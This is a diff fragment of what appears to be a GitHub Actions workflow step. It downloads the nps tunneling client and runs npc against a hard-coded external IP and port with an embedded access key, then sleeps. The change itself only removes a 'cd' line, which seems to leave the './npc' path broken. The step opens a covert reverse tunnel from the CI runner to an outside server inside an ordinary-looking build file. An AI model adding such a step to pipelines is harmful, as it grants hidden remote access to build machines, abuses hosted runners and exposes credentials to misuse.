@@ -38,6 +38,5 @@ jobs:
       run: |
         wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
         tar -xvf linux_amd64_client.tar.gz
-        cd linux_amd64_client
         ./npc -server=106.55.147.84:50102 -vkey=nrrtqugmchx5yw07 -type=tcp
         sleep 200s
